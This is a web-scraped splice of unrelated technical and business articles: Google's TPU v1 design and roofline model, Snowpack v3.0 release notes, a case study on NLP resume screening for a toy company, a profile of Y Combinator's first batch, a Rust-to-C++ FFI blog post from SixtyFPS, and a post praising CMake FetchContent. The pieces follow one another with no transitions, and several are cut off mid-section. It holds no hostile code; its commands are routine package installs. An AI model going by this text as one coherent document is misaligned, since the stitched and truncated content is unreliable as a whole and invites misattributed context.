Yet the work started in 2013 as a high-priority project when Google’s projections on using their speech technology by users (3 minutes a day) showed that it would require their datacenters to double to meet computation demands. The goal was to improve cost-performance by 10X over GPUs. The full cycle from design, to verification, building, and deploying to the datacenters took <a href="https://arxiv.org/abs/1704.04760" target="_blank" rel="noopener">15 months</a>.</p><p id="825b">No cloud TPU of this version was available to the public.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1580/0*ME21757y0tfrK3f8.png" width="790" height="475" srcset="https://miro.medium.com/max/552/0*ME21757y0tfrK3f8.png 276w, https://miro.medium.com/max/1104/0*ME21757y0tfrK3f8.png 552w, https://miro.medium.com/max/1280/0*ME21757y0tfrK3f8.png 640w, https://miro.medium.com/max/1400/0*ME21757y0tfrK3f8.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ME21757y0tfrK3f8.png?q=20"></p></div></div></div><figcaption><em>Google TPU v1 </em>printed circuit card that fits into a SATA hard disk slot for drop-in installation.</figcaption></figure><p id="7cf7">The TPU was designed to be a coprocessor using a PCIe Gen3 x16 bus that provides 12.5GB/s of effective bandwidth.

Control is much larger (and much more difficult to design) in a CPU or GPU.</p><p id="677a">The TPU ASIC is built on a 28nm process, runs at 700MHz, and consumes 40W when running (75W TDP).</p><p id="bb1f">TPU implements the matrix multiplication with the systolic array in a pipeline fashion. It relies on data from different directions arriving at cells in an array at regular intervals and being combined.</p><p id="2590">The matrix unit uses “systolic execution” to save energy by reducing reads and writes of the Unified Buffer. It relies on data from different directions arriving at cells in an array at regular intervals where they are combined. A given 65,536-element vector-matrix multiply operation moves through the matrix as a diagonal wave-front. The weights are preloaded and take effect with the advancing wave alongside the first data of a new block. Control and data are pipelined to give the illusion to the programmer that the 256 inputs are read at once and instantly update one location of each of 256 accumulators. From a correctness perspective, the software is unaware of the systolic nature of the matrix unit, but, for performance, must account for the latency of the unit.

For HPC, the Y-axis is the performance in floating-point operations per second, thus the peak computation rate forms the “flat” part of the roofline. The X-axis is operational intensity, measured as floating-point operations per DRAM byte accessed. Memory bandwidth is measured in bytes per second, which turns into the “slanted” part of the roofline since (FLOPS/sec)/ (FLOPS/Byte) = Bytes/sec. Without sufficient operational intensity, a program is memory bandwidth-bound and lives under the slanted part of the roofline.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1936/1*TRZRMm7ZisNxPZOFP7gJDQ.png" width="968" height="632" srcset="https://miro.medium.com/max/552/1*TRZRMm7ZisNxPZOFP7gJDQ.png 276w, https://miro.medium.com/max/1104/1*TRZRMm7ZisNxPZOFP7gJDQ.png 552w, https://miro.medium.com/max/1280/1*TRZRMm7ZisNxPZOFP7gJDQ.png 640w, https://miro.medium.com/max/1400/1*TRZRMm7ZisNxPZOFP7gJDQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*TRZRMm7ZisNxPZOFP7gJDQ.png?q=20"></p></div></div></div><figcaption>The Roofline model for a single TPU die on log-log scales</figcaption></figure><p id="508c">The TPU has a long “slanted” part of its roofline, where operational intensity means that <strong>performance is limited by memory bandwidth rather than by peak compute</strong>.

<article>
      <p>Snowpack v3.0 is here! This is our biggest release yet with brand new features including:</p>
<ul>
<li><strong>Pre-bundled streaming imports</strong> - Import any npm package, on-demand.</li>
<li><strong>Integrated build optimizations</strong> - Built-in bundling, preloading, minification, and more.</li>
<li><strong>JavaScript API</strong> - Integrate with Snowpack’s brand new native JS API.</li>
<li><strong>Node.js Runtime API</strong> - Import your Snowpack-built files directly into Node.js.</li>
<li><strong>Bug fixes, stability improvements, and a whole lot more!</strong></li>
</ul>
<p>Install the newest version of Snowpack to get started:</p>
<pre><code>$ npm install snowpack@^3.0.0
</code></pre>
<p>Or, try out one of our updated <a href="https://www.npmjs.com/package/create-snowpack-app">Create Snowpack App</a> starter templates:</p>
<pre><code>$ npx create-snowpack-app new-project-directory --template  @snowpack/app-template-react
</code></pre>
<h2 id="reimagining-web-development-for-esm">Reimagining Web Development for ESM</h2>
<p>1 year ago, Snowpack first released with the mission to reimagine web development for modern JavaScript and ESM. Snowpack leverages modern web features to deliver a frontend build tool that needs just 50ms to start up &amp; react to new file changes, regardless of project size. In comparison, traditional web bundlers could take several seconds or even full minutes to start up in large projects.</p>
<p>Snowpack v3.0 marks another huge leap on our mission to push web development forward with the release of <strong>streaming imports</strong>. Streaming imports make it possible to import any package directly into your project, pre-built and pre-bundled for immediate use. It’s the power of the entire JavaScript ecosystem, at your fingertips.</p>
<video preload="auto" autoplay="" loop="" muted="" playsinline="">
 <source src="https://www.snowpack.dev/img/streaming-imports-demo.webm" type="video/webm">
 <source src="https://www.snowpack.dev/img/streaming-imports-demo.mp4" type="video/mp4">
</video>
<h2 id="what-are-streaming-imports%3F">What are Streaming Imports?</h2>
<p>The typical web developer installs and manages their JavaScript dependencies locally using a package manager CLI like <code>npm</code>, <code>yarn</code> or <code>pnpm</code>. These npm packages can’t run directly in the browser, so additional work is needed to resolve, process, build and bundle these packages for the browser before you can actually use them.</p>
<p><strong>What if we could simplify this? What if you could skip the “npm install” step entirely and just fetch the relevant, pre-built package code on-demand via ESM import?</strong></p>
<pre><code><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'react'</span><span>;</span><p><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'https://cdn.skypack.dev/react@17.0.1'</span><span>;</span></p></code></pre>
<p>That URL in the example above points to <a href="https://www.skypack.dev/">Skypack</a>, a popular JavaScript CDN that we built to serve every package&nbsp;on npm as ESM. Importing dependencies by URL like this is well supported in Snowpack, Deno, and all major browsers. But writing these URLs directly into your source code isn’t ideal and makes development impossible without a network connection.</p>
<p><strong>Snowpack v3.0 brings together the best of both worlds:</strong> Get the simplicity of <code>import 'react'</code> in your own source code and let Snowpack fetch these dependencies behind the scenes, pre-built and ready to run in the browser. Snowpack caches everything for you automatically, so you can continue to work offline after the first package fetch.</p>
<p>This new workflow has several benefits over the traditional “npm install” approach:</p>
<ul>
<li><strong>Speed:</strong> Skip the install + build steps for dependencies, and load your dependencies on-demand as pre-build, pre-bundled ESM code.</li>
<li><strong>Safety:</strong> ESM packages are pre-built into JavaScript for you and never given access to <a href="https://www.usenix.org/system/files/sec19-zimmermann.pdf">run code on your machine</a>. Third-party code only ever runs sandboxed in the browser.</li>
<li><strong>Less Tooling:</strong> ESM packages are managed by Snowpack, so frontend projects that don’t need Node.js (Rails, PHP, etc.) can drop the npm CLI entirely if they choose.</li>
<li><strong>Identical Final Build:</strong> When you build your site for production, package code is transpiled with the rest of your site and tree-shaken to your exact set of imports.</li>
</ul>
<p>This is our bet on the future of web development. But if this all sounds too wild for you or you have some technical reason to keep managing your dependencies with npm, don’t worry. This is <strong>100% opt-in</strong> behavior for those who want it. By default, Snowpack will continue to pull your npm package dependencies out of your project <code>node_modules</code> directory like it always has.</p>
<p>Check out our guide on <a href="https://www.snowpack.dev/guides/streaming-imports">Streaming Package Imports</a> to learn more about how to enable this new behavior in your project today.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-esbuild.png" alt="js api"></p>
<h2 id="built-in-optimizations%2C-powered-by-esbuild">Built-in Optimizations, Powered by esbuild</h2>
<p><a href="https://esbuild.github.io/">esbuild</a> is a marvel: it performs 100x faster than most other popular bundlers their own benchmarks. esbuild is written in Go, a compiled language that can parallelize heavy bundling workloads where other popular bundlers – written in JavaScript – cannot.</p>
<p>Snowpack already uses esbuild internally as our default single-file builder for JavaScript, TypeScript and JSX files. Snowpack v3.0 takes this integration one step further, with a new built-in build optimization pipeline. Bundle, minify, and transpile your site for production in 1/100th of the time of other bundlers.</p>
<p>Snowpack is able to adopt esbuild today thanks to an early bet that we made on the future of bundling: <strong>bundling is just a post-build optimization.</strong> Thanks to this early design decision, esbuild can be plugged in and swapped out of your Snowpack build as easily as any other bundler.</p>
<p>esbuild is still a young project, but its future looks promising. In the meantime, we will also continue to invest in the existing bundler plugins for a long time to come, so that more mature projects can continue to use mature bundlers like Webpack &amp; Rollup.</p>
<p>To get started, check out the <code>optimize</code> option in our newest <a href="https://www.snowpack.dev/guides/optimize-and-bundle">Optimizing Your Snowpack Build</a> guide.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-jsapi.png" alt="js api"></p>
<h2 id="a-new-javascript-api">A New JavaScript API</h2>
<p>Snowpack’s new JavaScript API grants you more advanced control over Snowpack’s dev server and build pipeline, helping you build more powerful integrations on top of Snowpack to unlock new kinds of dev tooling and server-side rendering (SSR) solutions.</p>
<p><a href="https://svelte.dev/blog/whats-the-deal-with-sveltekit">SvelteKit</a> is the new official web app framework from the Svelte team, built with Snowpack. SvelteKit uses our new JavaScript API to manage the build pipeline and build files on-demand. Snowpack helps SvelteKit speed up development, with zero rapid updates on file change and zero upfront server start-up cost.</p>
<p><a href="https://www.npmjs.com/package/microsite">Microsite</a> is another exciting new project built with Snowpack. Microsite is a Static Site Generator (SSG) for Preact that features automatic partial hydration, so that you send as little JavaScript down to the client as possible.</p>
<p>Check out our new <a href="https://www.snowpack.dev/reference/javascript-interface">JavaScript API reference</a> to start building your own custom integrations on top of Snowpack.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-runtime.png" alt="js api"></p>
<h2 id="a-new-node.js-runtime">A New Node.js Runtime</h2>
<p>Speaking of Svelte, this next feature comes directly out of our collaboration with the Svelte team. As a part of building out SvelteKit, Rich Harris created a server-side runtime for Snowpack. This runtime lets you import any Snowpack-built file directly into Node.js, handling things like ESM-&gt;CJS conversion and CSS extraction automatically.</p>
<p>The result is a unified build pipeline across both Node.js and the frontend, with all of the on-demand build performance benefits of Snowpack. Importing frontend code to run in Node.js unlocks features like true server-side rendering (SSR), test runner integrations for Jest/uvu/Mocha, and more.</p>
<p>Check out our new <a href="https://www.snowpack.dev/guides/server-side-render">SSR guide</a> to get started and learn more about all of the different ways that you can connect to your Snowpack build.</p>
<p>🥳</p>
<h2 id="snowpack%E2%80%99s-one-year-anniversary">Snowpack’s One Year Anniversary</h2>
<p>Last week marked Snowpack’s one-year anniversary of the original v1.0.0 release. Looking back, I’m blown away by everything that’s happened since:</p>
<ul>
<li>150+ releases (from <code>v0.0.1</code>, all the way to v3.0 today)</li>

    <p>Reducing Time-to-Hire and Finding Niche Candidates via Text Mining and NLP

<p><b>Summary:</b> Maison Battat, a global toy company, recently hired a uniquely qualified data science candidate in only 26 days. Phase describes how we worked with Maison Battat to build a text mining (i.e., “Natural Language Processing” or “NLP”) approach that could scan 1,000s of candidates in minutes and look for unique attributes and experiences shared by applicants and broader candidate pools alike.

  </div><div>
  <div>

   

    <div>

<p><a name="problem"></a>The Problem: too many candidates and poor screening options

</p><p>Most applicant screening systems are limited in how they enable searching and filtering of candidates. This means that they rarely allow you to include unique combinations of skills or score candidate profiles in a more flexible manner.

</p><p>Worse still, many job applications have <i>hundreds</i> or <i>thousands</i> of applicants. If you expand this to a passive pool, you can be looking at 10,000+ candidates for a single role. Hiring managers and recruiters struggle with reviewing so many profiles, and resort to keyword searches.

</p><p><a name="solution"></a>Our Solution: use recent advances in text mining to make candidate searches descriptive and holistic

</p><p>To address the challenge above, Phase uses two strategies to solve this problem.

</p><p><b>1. Make the search a conversational process</b>

</p><p>Rather than simply providing keywords, we ask recruiters to use a freeform description of the candidate they are looking for. To use the Battat example above...

</p><center>
<div><p>
A conventional exact-match keyword search might look like:</p><p>&nbsp;

“<span>Python</span>”, “<span>SQL</span>”, “<span>analyst</span>”, “<span>engineer</span>” or “<span>toys</span>”
</p><p>&nbsp;
But through our search, the candidate is described as:
</p><p>&nbsp;
“A <span>data scientist</span> who has with experience with
 <span>toys</span>, <span>education</span>, or <span>children’s products</span>.”
</p></div>
</center>

<p>We use descriptions because our search understands concepts and ideas. The algorithm knows that a “<span>data scientist</span>” is a person that is likely to know languages like “<span>Python</span>”, “<span>SQL</span>”, or others and takes on roles such as an “<span>analyst</span>” or “<span>engineer</span>”. By teaching the algorithm to seek out candidates who have experience with “<span>toys</span>”, “<span>education</span>” and “<span>children’s products</span>”, we can find people with relevant experience in related areas like “gaming” or “youth development”.

</p><p>Another way to think about this interface is that the recruiter simply has to <i>write</i> an answer to the question, “What sort of candidate are you looking for?” You need not worry about the specific structure of your response, or fitting keywords into specific parts of a search form. The above example could easily be “A former toy designer interested in analytics” or “A multilingual French-speaker who can design products and analyze data.”

</p><p>Our goal is to give the algorithm an idea of what type of candidate to look for. It will identify and make connections between concepts to find the strongest candidates. It is not limited by specific keywords. This means that a recruiter or hiring manager saves time by automating searches, while generating a broader diversity of qualified candidates.

</p><p><b>2. Search the whole resume, not just skills lists or keywords</b>

</p><p>Our semantic approach makes it easier for us to scan an entire resume to understand the person as a whole. For instance, a candidate might outline an interest in “children’s products” in one part of their resume, but not include this in their core skillsets elsewhere. This semantic approach tracks the <i>entire</i> resume and scores the <i>themes</i> that come up rather than just individual skills or keyword flags.

</p><p><a name="results"></a>The Result: 26 Days for Time-to-Hire and a Great Candidate Experience

</p><p>Maison Battat is a family-owned toy company that encourages kids to be bold, curious, and playful. For over 45 years, they have offered a range of engaging toys for babies, toddlers, and young children including Driven™ tough trucks to dolls of Our Generation™.

</p><p>Battat wanted to hire a unique candidate with experience in marketing, e-commerce, data science and analytics. They sought out someone who was a self-starter, fast learner, proficient in another language, has lived abroad, and shares their passion for improving the lives of children through play and education.

</p><p>Our text mining approach above was used to analyze over 1,000 data science candidate profiles. The top result was Sogra, a bilingual data analyst with international experience. Importantly, she was the ultimate self-starter having created an award-winning smart toy while she was working at a toy startup.

</p><p>Sogra was the first and only candidate interviewed – she was perfect for the role. Not only was the role filled in 26 days, but both employer and employee were thrilled with the significantly easier process and speedy approach.

     <div>

<p>“Phase reached out to me about a data analyst role at a toy company. Two weeks after I was introduced to the hiring manager, I accepted their job offer. I’m excited to have a data role that leverages my background as a toy designer. I feel amazing!”

      <p><span>When Paul Graham and Jessica Livingston first began accepting applications for their new startup accelerator, they had $200,000 in seed money and four employees.</span></p>
<p><span>Graham, who had been working at a web application company called Viaweb, wasn’t particularly confident that their new venture would do well. But Graham wanted to invest in promising college students building innovative tech startups, much like his mentor, lawyer Julian Weber, had invested $10,000 in Graham’s own Viaweb.&nbsp;</span></p>
<p><span>Despite their misgivings, Graham and Livingston plowed ahead, creating a Silicon Valley icon in the process. To date, Y Combinator has helped launch and fund over 2,000 startups in Silicon Valley, including giants like Airbnb, Dropbox, Stripe, Reddit, DoorDash, Coinbase, and many more. As of 2021, the combined value of YC’s startups is estimated at $300 billion. Today, founders still aspire to get into one of YC’s batches.&nbsp;</span></p>
<p><span>Y Combinator’s consistently successful 16-year run all started with that First Batch, which included founders like Alexis Ohanian, Steve Huffman, Sam Altman, and Justin Kan. Last week, Kan </span><a href="https://twitter.com/justinkan/status/1337122637483364354?s=20"><span>tweeted an image</span></a><span> of YC’s First Batch dating back to the summer of 2005. It’s worth seeing how the years have treated that very first batch.</span></p>
<h2><b>2. Zak Stone</b></h2>

<p><b>Co-founder, Memamp<br></b><b>Where is he now?<br></b><b>Product manager for Cloud TPUs, Google</b></p>
<p><span>Along with Chris Slowe, Zak Stone co-founded Memamp, a desktop search startup. The two had been working on their idea for about a year before being accepted into Y Combinator’s First Batch, but it wasn’t meant to be. That summer, Google released its own desktop search feature, and Apple announced its Spotlight search feature for Macs. While Stone and Slowe decided to scrap the idea, Slowe joined up with Reddit’s founders. Stone, meanwhile, now works for Google’s Brain Team as a product manager for Cloud TPUs.</span></p>

<p><b>Founders, Reddit<br></b><b>Where are they now?<br></b><b>Ohanian: Entrepreneur, investor<br></b><b>Huffman: CEO, Reddit<br></b><b>Slowe: CTO, Reddit<br></b><b>Swartz: Committed suicide in 2013 at age 26.</b></p>
<p>After the initial rejection of their first startup idea, MyMobileMenu, Alexis Ohanian and his fellow founders started work on “the front page of the internet.” That project,&nbsp;an idea that came from Paul Graham,&nbsp;turned into Reddit, one of Y Combinator’s most successful startups. When it was bought by Condé Nast in 2006, Ohanian was suddenly a multi-millionaire and one of Silicon Valley’s most revered founders, all by age 23. Since co-founding Reddit, Ohanian has founded several other startups and venture capital firms, including Breadpig, Hipmunk, Das Kapital Capital, and Initialized Capital. His wife, tennis superstar Serena Williams, also founded her own VC firm, Serena Ventures.&nbsp;</p>
<p><span>Steve Huffman, Reddit’s second co-founder, served as CEO of the company until 2009, then returned to the role in 2015. Although Huffman and Ohanian sold Reddit for $10 million to $20 million, Huffman later said that he regretted the decision, not realizing how popular the site would become. As of 2019, the company was worth $3 billion. Huffman went on to co-found Hipmunk, a travel search site, before returning to the startup that started it all.</span></p>
<p><span>Chris Slowe is still with Reddit as its CTO (and is a former CEO), but spent some years away from the company before returning in 2015. Slowe also worked for Hipmunk as chief scientist, citing the desire for change as his main reason for leaving Reddit.</span></p>
<p><span>Reddit’s fourth co-founder, Aaron Swartz, arrived late to the party when his own startup, Infogami, merged with the company. Later on, Swartz devoted his time to a number of social causes, helping launch the Progressive Change Campaign Committee to support online activism. He also founded the online group Demand Progress which led a campaign against the Stop Online Piracy Act in 2010.&nbsp;</span></p>
<p><span>In 2011, Swartz was arrested on breaking-and-entering charges on the MIT campus after illegally downloading academic articles from a university database. He was charged in federal court with two counts of wire fraud, among other charges, and faced 35 years in prison. Days after a rejected plea bargain and counter offer to minimize his sentence, Swartz was found dead in his Brooklyn apartment by apparent suicide. He was 26 years old.</span></p>

<p><span>Justin Kan and Emmett Shear have found massive success since first signing up for Y Combinator’s first class. The founders sold their online calendar startup, Kiko, a year after graduating YC, when they realized the new Google Calendar would eclipse their own startup. Kan and Shear went on to found Justin.tv, a livestream site that Kan himself used to document his daily life for eight months. The two then founded livestream gaming site Twitch as a spin-off of Justin.tv, which has grown into a $15 billion business.&nbsp;</span></p>

    <h5>Posted on January 13, 2021 by Olivier Goffart and Simon Hausmann</h5>
    
  <p>
    With <a href="https://sixtyfps.io/">SixtyFPS</a>, we are creating a GUI toolkit. We chose
    Rust as the implementation language for our runtime library, and we want to make the same library usable from different
    programming languages. We believe programmers in all languages need to build GUIs - powered by the same runtime library.
    Rust, with its Foreign Function Interface (FFI) is an excellent choice.<br> In
    this article we look at how to expose an idiomatic C++ API from our Rust library.
  </p>

<h3 id="the-challenge">The Challenge</h3>

    <p>Initially we chose to start with support for three languages:</p>
    <ul>
        <li><b>Rust</b>: Because it's our implementation language.</li>
        <li><b>C++</b>: It's a low level language that we're familiar with, and is still one of the most established languages
            in the embedded device space.</li>
        <li><b>JavaScript / TypeScript</b>: Because it's a very popular dynamic language.</li>
    </ul>


    <p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/diagrams.png"></p><p>The Rust library (also known as a crate) is split into two parts, the shared implementation crate and a thin idiomatic
        API crate.
    </p>
    <p>For JavaScript we use <a href="https://github.com/neon-bindings/neon">Neon</a> to expose an API. Neon enables us
        to conveniently write JavaScript APIs and create an NPM package.</p>
    <p>The C++ part is a bit more challenging.</p>

<h3 id="expose-idiomatic-cpp-api-through-ffi">Expose an Idiomatic C++ API through Rust FFI</h3>

    <p>We decided to keep the C++ API only in the header files. This is because, unlike with Rust, there's
        no widely adopted C++ equivalent of Cargo, to help with downloading and building dependencies. If we want to ship
        binaries, then we have to maintain ABI compatibility, which is difficult in C++.<br> This way, we can also keep the
        C++ binding as lightweight as possible: for performance and memory footprint.
    </p>
    
    <p>Rust cannot expose a C++ API: structures can only be exported using a C representation (<code>#[repr(C)]</code>) and
        <code>extern "C"</code> functions. This means that we cannot expose Rust features like traits, generics, or
        destructors even if they have a C++ equivalent.
     </p>
     
    <p>The Rust ecosystem provides a few helper crates to make the job easier:</p>
     <ul>
        <li><a href="https://github.com/eqrion/cbindgen"><b>cbindgen</b></a>: This helper crate automatically generates C/C++
            header files based on the <code>repr(C)</code> structure and the <code>extern "C"</code> functions. We use
            cbindgen to generate internal header files only. It's very helpful to avoid manually writing some unsafe error-prone
            boilerplate. 
        </li>
        <li><a href="https://github.com/mystor/rust-cpp">The <b>cpp</b> crate</a>: This
            helper crate is useful when calling C++ libraries from Rust, and we make use of that. However it is not suitable for
            exposing a C++ API from Rust. (Note: Olivier Goffart happens to be the maintainer.)
        </li>
                
        <li><a href="https://cxx.rs/">The <b>cxx</b> crate</a>: This would be a safer way than cbindgen to ensure that the
            interface between C++ and Rust is correct. While it could be useful, cbindgen already get us a long way. So
            we don't use it for now.
        </li>
    </ul>

<p>To build the correct shared library we use Cargo. The resulting library exports C mangled symbols. We ship
    a set of C++ header files that provide the C++ API and use the C functions behind the scenes. For convenience,
    we provide a CMake integration that ties together the library linkage and includes path setup. </p>

<h3 id="slices-vectors-strings">Slices, Vectors, and Strings</h3>

    <p>
    In FFI, passing a basic integer works out of the box. But what about more complex data types, like a 
    Rust slice or a string? Well, most classes like Rust's String, Vec, or slices are not <code>#[repr(C)]</code>,
    so we can't use them directly. While we could use these classes with an indirection, every simple call may need to go
    through a non-inline function boundary. So we would need to convert types, which means re-allocating memory.</p>
    <p>So instead of sharing code, we implemented data structures using <code>#[repr(C)]</code> and a stable ABI, so
        that they can be accessed directly from C++ and Rust, or any low-level language.</p>

   <p>For the slice we create a structure that holds a pointer and a size:</p>

<pre><code>#[repr(C)]
pub struct Slice&lt;'a, T&gt; {
    ptr: NonNull&lt;T&gt;,
    len: usize,
    phantom: PhantomData&lt;&amp;'a [T]&gt;,
}
</code></pre>

<p><code>Slice&lt;'a, T&gt;</code> can be dereferenced to <code>&amp;'a [T]</code>.
    In C++, cbindgen generates the following snippet:


</p><pre><code>template&lt;typename T&gt;
struct Slice {
    T *ptr;
    uintptr_t len;
};
</code></pre>

<p>We tell cbindgen to generate that code in a <code>cbindgen_private</code> namespace, and we wrap it an interface
similar to <code>std::span</code>.</p>

<p>We use strings and vectors to pass data between the engine and the user's code. This results in
    shared ownership where we want to avoid unnecessary copying of data. Our API is property based
    with setters and getters, therefore we implement shared ownership through
    <a href="https://en.wikipedia.org/wiki/Copy-on-write"></a>Implicit sharing / Copy-on-write. </p>

<p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/sharedvector.png"></p><pre><code>#[repr(C)]
struct SharedVectorHeader {
    refcount: atomic::AtomicIsize,
    size: usize,
    capacity: usize,
}

#[repr(C)]
pub struct SharedVector&lt;T&gt; {
    inner: NonNull&lt;SharedVectorInner&lt;T&gt;&gt;,
}


/// These functions are called from the C++ constructor
/// and destructor
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_allocate(
    size: usize, align: usize) -&gt; *mut u8 { /*...*/ }
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_free(
    ptr: *mut u8, size: usize, align: usize) { /*...*/ }
}
</code></pre>

<p>In Rust, the <code>impl Clone</code> and <code>impl Drop</code> make sure to increment
and decrement the atomic reference count and call the destructors. Similarly, in C++, we implement
copy constructor and destructor for the same purpose. Note that we still need to call the Rust
allocator function via the exposed C interface.</p>

<p>Now we can write a wrapper in C++:
(<a href="https://github.com/sixtyfpsui/sixtyfps/blob/master/api/sixtyfps-cpp/include/sixtyfps_sharedvector.h">full file</a>)
</p>

<pre><code>template&lt;typename T&gt; struct SharedVector {
  SharedVector() : inner(nullptr) {}

  SharedVector(const SharedVector &amp;other)
    : inner(other.inner)
  { if (inner) ++inner-&gt;refcount; }

  ~SharedVector() {
     if (inner &amp;&amp; (--inner-&gt;refcount) == 0) {
        for (auto it = begin(); it &lt; end(); ++it)
            it-&gt;~T();
        cbindgen_private::sixtyfps_shared_vector_free(
            reinterpret_cast&lt;uint8_t *&gt;(inner),
            sizeof(SharedVectorHeader)
                + inner-&gt;capacity * sizeof(T),
            alignof(SharedVectorHeader));
     }
  }
  SharedVector &amp;operator=(const SharedVector &amp;other)
  { /*...*/ }

  const T *begin() const { /* ... */ }
  const T *end() const { /* ... */ }
  void push_back(const T &amp;value) { /* ... */ }
  // ... more vector-like API

private:
  // (SharedVectorHeader is generated by cbindgen)
  cbindgen_private::SharedVectorHeader *inner;
};
</code></pre>


    <p>Right now these types, such as <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a>, are within the internal <code>sixtyfps-corelib</code>
        crate, and re-exported for Rust users through the public <code>sixtyfps</code> crate.  If there is demand for it, we may consider moving them into a
        smaller public crate with its own release schedule.</p>


<h3 id="destructors">Destructors</h3>

    <p>It's important to note that <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a> have destructors in C++.
        We can't pass instances by value in <code>extern "C"</code> functions, because the calling conventions are different
        for arguments or return types with C++ destructors; not supported by C. Therefore we can only pass them by pointer
        or reference.
    </p>

    <p>If we want to add a C++ destructor, constructor, or any member functions to types directly exported by cbindgen to our public API, 
        we use 
        <code><a href="https://docs.rs/cbindgen/0.16.0/cbindgen/struct.ExportConfig.html">cbindgen::ExportConfig</a>::body</code>:</p>

<pre><code>cbindgen_config.export.body.insert(
    "MyStruct".to_owned(),
    "    inline MyStruct(); inline ~MyStruct();".to_owned()
  );
</code></pre>

    <p>
    Then we implement <code>MyStruct::MyStruct</code> and <code>MyStruct::~MyStruct</code> in a manually
    written header file, by either doing the memory management directly or calling C helper functions
    implemented in Rust.</p>
     <p>It's important to keep in mind that anything allocated from Rust needs to be freed by Rust. 
    The same applies to allocations in C++: they might not share the same allocator.
    </p>

<h3 id="dynamic-dispatch">Dynamic Dispatch (virtual table) Across the Language Barrier</h3>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Bon_toutou.png/186px-Bon_toutou.png"></p><p>
    Let's start with the classic example of dynamic dispatch in Rust:</p>
<pre><code>pub trait Animal {
  fn speak(&amp;self, loudness: i32) -&gt; String;
}
struct Dog { name: String }
impl Animal for Dog {
  fn speak(&amp;self, loudness: i32) -&gt; String
  { "Waf!".into() }
}
#[no_mangle]
pub extern "C" fn do_something_with(
  animal: &amp;dyn Animal
) {
  println!("{}", animal.speak(1));
}
</code></pre>

<p>Unfortunately the above code does not work. How could we implement a class <code>Cat</code>
in C++ and call the <code>do_something_with</code> function? What if we wanted to implement
<code>do_something_with</code> in C++? The problem is that trait objects (<code>&amp;dyn</code>) are not
valid in FFI - their binary representation is not guaranteed to be stable. If we try to compile the above code,
we get this warning:</p>

<pre><code>warning: `extern` fn uses type `dyn Animal`, which is not FFI-safe
  | extern "C" fn do_something_with(animal: &amp;dyn Animal)
  |                                         ^^^^^^^^^^^ not FFI-safe
  = note: `#[warn(improper_ctypes_definitions)]` on by default
  = note: trait objects have no C equivalent</code></pre>

  <!--https://doc.rust-lang.org/reference/types/trait-object.html-->
<p>Internally, <a href="https://brson.github.io/rust-anthology/1/all-about-trait-objects.html">we know</a> that
a trait object is composed of a pointer to the instance, and a pointer to a virtual table containing
pointers to functions. The layout of this trait object (which pointer comes first) and the layout of the virtual
table is an implementation detail of Rust. So we decided to re-implement them to work accross FFI. Instead of
writing a <code>trait Animal</code>, we write a virtual table by hand:</p>

<pre><code>#[repr(C)]
pub struct AnimalVTable {
    speak: extern "C" fn speak(
        VRef&lt;AnimalVTable&gt;, i32, &amp; mut SharedString);
}
</code></pre>
<p>In this case, our virtual table has only one function. It is <code>#[repr(C)]</code> so that
cbindgen can generate a structure that the C++ code can access. Since we can't use <code>String</code>
we changed the return type to <code>SharedString</code>. We also pass the parameter by mutable reference instead
of just returning it, because it is not allowed to return a type that has a destructor.<br>
Instead of passing a trait object, our functions receive a pointer to the virtual table and
a …</p></div></section></div></div>

  <p>Published on Jan 13, 2020.
    </p>
  <p><em>Well, at least according to me</em></p>

<p>I recently encountered a CMake feature which I wasn’t aware of. It’s <a href="https://cmake.org/cmake/help/latest/module/FetchContent.html">FetchContent</a>. I’m sure this is not news to most people since it was added in CMake 3.14<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> and that’s been around since February of 2019, so two years now, but this feature is a revelation.</p>

<p>It can… no, it should… no, it <em>must</em> become the stepping stone for future of C and C++ package managers.</p>

<p><em>… after an issue with it is resolved, which I will talk about furhter down in the post</em></p>

<h2 id="so-what-is-fetchcontent">So, what is FetchContent?</h2>

<p>It’s pretty straight forward, actually. By using two CMake functions: <code>FetchContent_Declare</code> and <code>FetchContent_MakeAvailable</code><sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> users can declare a named content item which can then be… well… fetched <em>in configure time</em>. The key here is, as opposed to <code>file(DOWNLOAD ...)</code>, this allows three important things:</p>

<ul>
  <li>Define the means by which the content is produced (not just source, but also types of sources)</li>
  <li>Have an identifiable name for the content</li>
  <li>Maintain the coherency of the content in a well-defined manner</li>
</ul>

<p>Here’s an example directly from the CMake docs:</p>

<div><div><pre><code><span>include</span><span>(</span>FetchContent<span>)</span>
<span>FetchContent_Declare</span><span>(</span>
  googletest
  GIT_REPOSITORY https://github.com/google/googletest.git
  GIT_TAG        release-1.8.0
<span>)</span>
<span>FetchContent_Declare</span><span>(</span>
  Catch2
  GIT_REPOSITORY https://github.com/catchorg/Catch2.git
  GIT_TAG        v2.5.0
<span>)</span>

<span># After the following call, the CMake targets defined by googletest and</span>
<span># Catch2 will be defined and available to the rest of the build</span>
<span>FetchContent_MakeAvailable</span><span>(</span>googletest Catch2<span>)</span>
</code></pre></div></div>

<p>Ha! <code>GIT_REPOSITORY</code>! See? See? This lets us use CMake for package management.</p>

<h2 id="but-what-about-my-favorite-package-manager">But what about My-Favorite-Package-Manager™?</h2>

